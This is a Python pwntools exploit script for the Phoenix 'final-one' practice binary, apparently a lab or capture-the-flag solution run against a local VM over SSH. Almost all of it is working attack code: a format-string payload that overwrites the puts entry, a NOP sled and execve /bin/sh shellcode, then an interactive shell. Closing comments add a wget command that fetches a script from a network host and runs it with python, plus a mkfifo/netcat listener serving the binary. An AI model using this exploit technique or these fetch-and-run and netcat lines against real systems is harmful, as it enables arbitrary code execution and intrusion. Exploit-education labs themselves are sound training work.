from pwn import *
import sys
import time

shell = ssh("user", "127.0.0.1", 2222, password="user")
p = shell.process(["/opt/phoenix/i486/final-one", "--test"])
#pid = gdb.debug(["/opt/phoenix/i486/final-one", "--test"], gdbscript="""
pid = gdb.attach(p, gdbscript="""
b *logit+66
continue
""", ssh=shell)

#shellcode_addr = 0xffffcdb0 #GDB
shellcode_addr = 0xffffcdd0 #local

puts_plt = 0x8049e58

alignment = b"AAAA"
buf = b"username XXX" + alignment
buf += p32(puts_plt) + alignment
buf += p32(puts_plt + 1) + alignment
buf += p32(puts_plt + 2)               # no alignment cuz last two bytes are the same
buf += p32(puts_plt + 3)
buf += b"%x%x%x%x%x%x%x%x%x%x"

buf += b"\x90"*50
# pwn shellcraft -nz -f d i386.linux.sh
buf += b"\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80"
buf += b"\n"
buf += b"login "
buf += b"%0245x%n"
buf += b"%029x%n"
buf += b"%050x%n"
buf += b"%n"
buf += b"\n"

#sys.stdout.buffer.write(buf)
#print(p.recvuntil(b"$ ").decode())
time.sleep(5)

p.sendafter(b"$ ", buf)
p.interactive()

'''
./final-one --test <<< `wget -q -O /tmp/input.py http://192.168.8.119:8000/final-one.py && python /tmp/input.py`
r --test <<< `wget -q -O /tmp/input.py http://192.168.8.119:8000/final-one.py && python /tmp/input.py`

mkfifo /tmp/pipi
./final-one --test < /tmp/pipi | nc -lnp 1212 > /tmp/pipi

PLAN:
    overwrite puts with shellcode addr
    multiple overwrites

0xffffcdec -> shellcode addr

b *logit+66
'''
